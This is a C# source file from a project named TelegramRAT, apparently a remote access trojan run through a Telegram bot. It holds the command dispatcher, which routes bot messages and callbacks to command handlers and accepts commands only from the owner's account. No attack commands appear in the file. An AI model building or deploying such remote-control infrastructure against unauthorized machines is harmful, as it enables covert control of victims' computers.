using TelegramRAT.Services;
using Telegram.Bot.Types;
using Telegram.Bot;

namespace TelegramRAT.Commands;

public interface ICommandDispatcher
{
    Task DispatchAsync(Update update);
}

public class CommandDispatcher(
    IEnumerable<IBotCommand> commands,
    ITelegramBotClient botClient,
    IBotNotificationService notificationService,
    IBotSession session) : ICommandDispatcher
{
    private readonly Dictionary<string, IBotCommand> _commandCache = InitializeCommandCache(commands);

    private static Dictionary<string, IBotCommand> InitializeCommandCache(IEnumerable<IBotCommand> cmds)
    {
        var cache = new Dictionary<string, IBotCommand>(StringComparer.OrdinalIgnoreCase);
        foreach (var command in cmds)
        {
            cache[command.Command] = command;
            if (command.Aliases != null)
            {
                foreach (var alias in command.Aliases)
                {
                    cache[alias] = command;
                }
            }
        }
        return cache;
    }

    public async Task DispatchAsync(Update update)
    {
        if (update.CallbackQuery is not null)
        {
            await HandleCallbackQueryAsync(update.CallbackQuery);
            return;
        }

        if (update.Message is null) return;

        var message = update.Message;
        var messageChatId = message.Chat?.Id;
        var messageSenderId = message.From?.Id ?? messageChatId;

        if (!await EnsureAuthorizedAsync(messageSenderId, messageChatId, "message", respond: true))
        {
            return;
        }

        var model = BotCommandModel.FromMessage(message, "/");
        if (model == null) return;

        if (model.Command == null || !_commandCache.TryGetValue(model.Command, out var command)) return;

        if (command.Validate(model))
        {
            if (!await EnsureAuthorizedAsync(messageSenderId, messageChatId, "command execution", respond: false))
            {
                return;
            }

            try
            {
                await command.ExecuteAsync(model);
            }
            catch (Exception ex)
            {
                if (model.Message != null) await notificationService.ReportExceptionAsync(model.Message, ex);
            }
        }
        else
        {
            await botClient.SendMessage(
                update.Message.Chat.Id,
                $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
                replyParameters: new ReplyParameters { MessageId = update.Message.MessageId },
                parseMode: Telegram.Bot.Types.Enums.ParseMode.Html
            );
        }
    }

    private async Task HandleCallbackQueryAsync(CallbackQuery callback)
    {
        var callbackChatId = callback.Message?.Chat.Id ?? callback.From?.Id;
        var callbackSenderId = callback.From?.Id ?? callbackChatId;

        if (!await EnsureAuthorizedAsync(
                callbackSenderId,
                callbackChatId,
                "callback query",
                respond: true,
                unauthorizedResponder: async () =>
                {
                    await botClient.AnswerCallbackQuery(
                        callback.Id,
                        "You are not authorized to control this bot.",
                        showAlert: true
                    );

                    if (callbackChatId.HasValue)
                    {
                        await botClient.SendMessage(callbackChatId.Value, "You are not authorized to control this bot.");
                    }
                }))
        {
            return;
        }

        await botClient.AnswerCallbackQuery(callback.Id, "Callback received!");

        if (callback.Message?.ReplyMarkup != null)
        {
            await botClient.EditMessageReplyMarkup(
                callback.Message.Chat.Id,
                callback.Message.MessageId,
                replyMarkup: null
            );
        }

        if (callback.Data == "Show All Commands")
        {
            if (_commandCache.TryGetValue("commands", out var cmd))
            {
                if (!await EnsureAuthorizedAsync(callbackSenderId, callbackChatId, "callback command execution", respond: false))
                {
                    return;
                }

                try
                {
                    await cmd.ExecuteAsync(new BotCommandModel { Message = callback.Message, Command = "commands" });
                }
                catch (Exception ex)
                {
                    if (callback.Message != null)
                    {
                        await notificationService.ReportExceptionAsync(callback.Message, ex);
                    }
                }
            }
        }
    }

    private async Task<bool> EnsureAuthorizedAsync(
        long? senderId,
        long? chatId,
        string updateDescription,
        bool respond,
        Func<Task>? unauthorizedResponder = null)
    {
        var effectiveSenderId = senderId ?? chatId;

        if (effectiveSenderId == session.OwnerId)
        {
            return true;
        }

        if (effectiveSenderId is null)
        {
            Console.WriteLine($"Ignoring {updateDescription} with missing sender information.");
            return false;
        }

        Console.WriteLine($"Unauthorized {updateDescription} from {effectiveSenderId}.");

        if (respond)
        {
            if (unauthorizedResponder is not null)
            {
                await unauthorizedResponder();
            }
            else if (chatId.HasValue)
            {
                await botClient.SendMessage(chatId.Value, "You are not authorized to control this bot.");
            }
        }

        return false;
    }
}
